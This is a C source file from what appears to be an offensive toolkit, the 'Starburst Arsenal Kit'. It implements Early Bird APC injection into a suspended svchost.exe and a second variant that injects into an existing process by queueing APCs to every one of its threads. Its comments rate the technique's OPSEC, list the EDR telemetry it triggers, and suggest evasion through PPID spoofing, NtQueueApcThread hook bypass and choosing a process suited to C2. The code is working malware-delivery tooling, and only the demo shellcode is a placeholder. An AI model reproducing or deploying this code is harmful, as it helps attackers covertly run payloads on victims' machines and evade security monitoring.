/*
 * inject_apc.c - QueueUserAPC Early Bird Injection
 *
 * Starburst Arsenal Kit - Injection Techniques
 * =============================================
 *
 * TECHNIQUE: Early Bird APC Injection
 *
 * This technique creates a new process in a suspended state, queues
 * an APC (Asynchronous Procedure Call) to the main thread before it
 * begins executing, then resumes the thread. The APC fires before
 * the process's own code runs, hence "Early Bird."
 *
 * FLOW:
 *   1. CreateProcess (CREATE_SUSPENDED) - spawn sacrificial process
 *   2. VirtualAllocEx (RW) - allocate memory in new process
 *   3. WriteProcessMemory - write shellcode
 *   4. VirtualProtectEx (RX) - flip protection
 *   5. QueueUserAPC - queue shellcode as APC to main thread
 *   6. ResumeThread - main thread runs, APC fires first
 *
 * OPSEC RATING: MEDIUM
 *
 *   Avoids CreateRemoteThread which is the most monitored injection
 *   indicator. APC-based execution is less commonly flagged, though
 *   sophisticated EDRs do monitor QueueUserAPC. The main weakness is
 *   the suspended process creation pattern, which is inherently
 *   suspicious when followed by memory writes.
 *
 * DETECTION SURFACE:
 *   - ETW: Microsoft-Windows-Threat-Intelligence
 *       * EtwTiVirtualAllocEx (remote allocation)
 *       * EtwTiWriteVirtualMemory (cross-process write)
 *       * EtwTiProtectVirtualMemory (protection change)
 *       * EtwTiQueueUserApc (APC queue to remote thread)
 *   - Kernel callbacks:
 *       * PsSetCreateProcessNotifyRoutineEx (new process)
 *       * ObRegisterCallbacks (handle acquisition)
 *   - User-mode hooks:
 *       * CreateProcessA/W - process creation
 *       * VirtualAllocEx - remote allocation
 *       * WriteProcessMemory - cross-process write
 *       * QueueUserAPC - APC queuing
 *   - Behavioral:
 *       * Process created suspended then immediately written to
 *       * APC queued to thread in an alertable state
 *       * Short-lived suspended process pattern
 *       * Parent-child process relationship anomalies
 *
 * MONITORED API CALLS:
 *   CreateProcessA, VirtualAllocEx, WriteProcessMemory,
 *   VirtualProtectEx, QueueUserAPC, ResumeThread
 *
 * PROS:
 *   - No CreateRemoteThread call
 *   - APC executes before target process code runs
 *   - Clean process context (no existing hooks loaded yet)
 *   - Shellcode runs in context of a legitimate process
 *
 * CONS:
 *   - Suspended process creation is suspicious
 *   - Still uses VirtualAllocEx + WriteProcessMemory
 *   - Thread starts from unbacked memory
 *   - Some EDRs now specifically monitor APC injection patterns
 *   - Creates a new visible process (may be noticed)
 *
 * SACRIFICIAL PROCESS SELECTION:
 *   Choose a process that:
 *   - Is commonly running on the system (blends in)
 *   - Has network access if C2 communication is needed
 *   - Matches the architecture of the shellcode (x64 for x64)
 *   Good choices: svchost.exe, RuntimeBroker.exe, dllhost.exe
 *   The default here uses svchost.exe.
 *
 * ADAPTING FOR STARBURST PIC (Stardust framework):
 *   - Replace Win32 calls with Stardust equivalents
 *   - The sacrificial process path should be configurable
 *   - Consider using NtQueueApcThread instead of QueueUserAPC
 *     to bypass user-mode hooks
 *   - PPID spoofing via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
 *     should be added for production use
 *
 * COMPILE:
 *   cl.exe /W4 /O2 inject_apc.c /Fe:inject_apc.exe
 */

#include <windows.h>
#include <stdio.h>
#include "../include/injection.h"

/* Default sacrificial process to spawn */
#define SACRIFICIAL_PROCESS "C:\\Windows\\System32\\svchost.exe"

/*
 * inject - Perform Early Bird APC injection.
 *
 * Parameters:
 *   pid           - Ignored for this technique (we create our own process).
 *                   Pass 0. The PID of the created process is printed.
 *   shellcode     - Pointer to shellcode buffer
 *   shellcode_len - Size of shellcode in bytes
 *
 * Returns:
 *   TRUE on success, FALSE on failure.
 *
 * Notes:
 *   This technique creates its own sacrificial process rather than
 *   injecting into an existing one. The pid parameter is ignored.
 *   If you need to target a specific process, use inject_into_existing()
 *   which queues an APC to an alertable thread in a running process.
 */
BOOL inject(DWORD pid, LPVOID shellcode, SIZE_T shellcode_len) {
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    LPVOID              remoteBuffer = NULL;
    DWORD               oldProtect   = 0;
    BOOL                result       = FALSE;

    (void)pid; /* Unused - we create our own process */

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    /* --------------------------------------------------------
     * Step 1: Create sacrificial process in suspended state
     *
     * CREATE_SUSPENDED ensures the main thread does not begin
     * executing. This gives us a window to queue our APC
     * before any of the process's own code runs, including
     * before ntdll initialization completes in some variants.
     *
     * CREATE_NO_WINDOW prevents a console window from appearing
     * for console subsystem executables.
     * -------------------------------------------------------- */
    if (!CreateProcessA(
            SACRIFICIAL_PROCESS,
            NULL,                /* command line */
            NULL,                /* process security attributes */
            NULL,                /* thread security attributes */
            FALSE,               /* don't inherit handles */
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,                /* use parent environment */
            NULL,                /* use parent directory */
            &si,
            &pi)) {
        fprintf(stderr, "[!] CreateProcess failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Created suspended process PID %lu (TID %lu)\n",
            pi.dwProcessId, pi.dwThreadId);

    /* --------------------------------------------------------
     * Step 2: Allocate RW memory in the suspended process
     * -------------------------------------------------------- */
    remoteBuffer = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcode_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!remoteBuffer) {
        fprintf(stderr, "[!] VirtualAllocEx failed: %lu\n", GetLastError());
        goto cleanup_process;
    }
    fprintf(stderr, "[+] Allocated %zu bytes at 0x%p\n",
            shellcode_len, remoteBuffer);

    /* --------------------------------------------------------
     * Step 3: Write shellcode to allocated memory
     * -------------------------------------------------------- */
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode,
                            shellcode_len, &bytesWritten)) {
        fprintf(stderr, "[!] WriteProcessMemory failed: %lu\n", GetLastError());
        goto cleanup_process;
    }
    fprintf(stderr, "[+] Wrote %zu bytes to target\n", bytesWritten);

    /* --------------------------------------------------------
     * Step 4: Flip memory protection to RX
     * -------------------------------------------------------- */
    if (!VirtualProtectEx(pi.hProcess, remoteBuffer, shellcode_len,
                          PAGE_EXECUTE_READ, &oldProtect)) {
        fprintf(stderr, "[!] VirtualProtectEx failed: %lu\n", GetLastError());
        goto cleanup_process;
    }
    fprintf(stderr, "[+] Memory protection changed to RX\n");

    /* --------------------------------------------------------
     * Step 5: Queue APC to the main thread
     *
     * QueueUserAPC queues a function to be called the next time
     * the thread enters an alertable wait state. For suspended
     * threads, the APC fires when the thread is resumed and
     * enters its initial alertable wait during initialization.
     *
     * The APC routine signature matches PAPCFUNC:
     *   VOID CALLBACK ApcRoutine(ULONG_PTR Parameter);
     * Our shellcode will receive NULL as the parameter.
     * -------------------------------------------------------- */
    DWORD apcResult = QueueUserAPC(
        (PAPCFUNC)remoteBuffer,
        pi.hThread,
        (ULONG_PTR)NULL
    );
    if (apcResult == 0) {
        fprintf(stderr, "[!] QueueUserAPC failed: %lu\n", GetLastError());
        goto cleanup_process;
    }
    fprintf(stderr, "[+] APC queued to thread %lu\n", pi.dwThreadId);

    /* --------------------------------------------------------
     * Step 6: Resume the main thread
     *
     * When the thread resumes, it will enter an alertable wait
     * as part of its initialization, causing our APC to fire.
     * The shellcode executes before the process's own entry
     * point is reached.
     * -------------------------------------------------------- */
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        fprintf(stderr, "[!] ResumeThread failed: %lu\n", GetLastError());
        goto cleanup_process;
    }
    fprintf(stderr, "[+] Thread resumed - APC will fire during init\n");

    /* Wait for the process to signal */
    WaitForSingleObject(pi.hProcess, INFINITE);
    fprintf(stderr, "[+] Process completed\n");

    result = TRUE;

cleanup_process:
    if (!result) {
        /* If injection failed, terminate the suspended process */
        TerminateProcess(pi.hProcess, 1);
        fprintf(stderr, "[*] Terminated sacrificial process\n");
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

cleanup:
    return result;
}

/*
 * inject_into_existing - APC injection into an existing process.
 *
 * This variant finds an alertable thread in an existing process and
 * queues an APC to it. Less reliable than Early Bird because the
 * target thread must enter an alertable wait for the APC to fire.
 *
 * Parameters:
 *   pid           - Target process ID
 *   shellcode     - Pointer to shellcode buffer
 *   shellcode_len - Size of shellcode in bytes
 *
 * Returns:
 *   TRUE on success, FALSE on failure.
 */
BOOL inject_into_existing(DWORD pid, LPVOID shellcode, SIZE_T shellcode_len) {
    HANDLE      hProcess     = NULL;
    HANDLE      hThread      = NULL;
    HANDLE      hSnapshot    = NULL;
    LPVOID      remoteBuffer = NULL;
    DWORD       oldProtect   = 0;
    BOOL        result       = FALSE;
    THREADENTRY32 te32;

    /* Open target process */
    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE, pid
    );
    if (!hProcess) {
        fprintf(stderr, "[!] OpenProcess failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Allocate, write, protect - same as above */
    remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcode_len,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuffer) {
        fprintf(stderr, "[!] VirtualAllocEx failed: %lu\n", GetLastError());
        goto cleanup;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode,
                            shellcode_len, &bytesWritten)) {
        fprintf(stderr, "[!] WriteProcessMemory failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (!VirtualProtectEx(hProcess, remoteBuffer, shellcode_len,
                          PAGE_EXECUTE_READ, &oldProtect)) {
        fprintf(stderr, "[!] VirtualProtectEx failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Find a thread in the target process */
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] CreateToolhelp32Snapshot failed: %lu\n",
                GetLastError());
        goto cleanup;
    }

    te32.dwSize = sizeof(THREADENTRY32);
    if (!Thread32First(hSnapshot, &te32)) {
        fprintf(stderr, "[!] Thread32First failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Queue APC to every thread in the target process.
     * At least one should be in an alertable wait state.
     * This is a shotgun approach - more targeted selection
     * would be preferable in production. */
    DWORD apcCount = 0;
    do {
        if (te32.th32OwnerProcessID == pid) {
            hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
            if (hThread) {
                if (QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, 0)) {
                    apcCount++;
                    fprintf(stderr, "[+] APC queued to thread %lu\n",
                            te32.th32ThreadID);
                }
                CloseHandle(hThread);
                hThread = NULL;
            }
        }
    } while (Thread32Next(hSnapshot, &te32));

    if (apcCount == 0) {
        fprintf(stderr, "[!] Failed to queue any APCs\n");
        goto cleanup;
    }

    fprintf(stderr, "[+] Queued %lu APCs to threads in PID %lu\n",
            apcCount, pid);
    result = TRUE;

cleanup:
    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE)
        CloseHandle(hSnapshot);
    if (hProcess) CloseHandle(hProcess);

    return result;
}

#ifdef BUILD_STANDALONE
#include <tlhelp32.h>

int main(int argc, char *argv[]) {
    /* Placeholder shellcode: NOP sled + breakpoint */
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90,
        0xCC
    };

    printf("[*] Early Bird APC Injection\n");

    if (argc == 2 && strcmp(argv[1], "--existing") != 0) {
        /* Inject into existing process */
        DWORD pid = (DWORD)atoi(argv[1]);
        printf("[*] Injecting into existing PID: %lu\n", pid);
        if (inject_into_existing(pid, shellcode, sizeof(shellcode))) {
            printf("[+] APC injection succeeded\n");
            return 0;
        }
    } else {
        /* Early Bird - create new process */
        printf("[*] Creating sacrificial process\n");
        if (inject(0, shellcode, sizeof(shellcode))) {
            printf("[+] Early Bird injection succeeded\n");
            return 0;
        }
    }

    printf("[-] Injection failed\n");
    return 1;
}
#endif
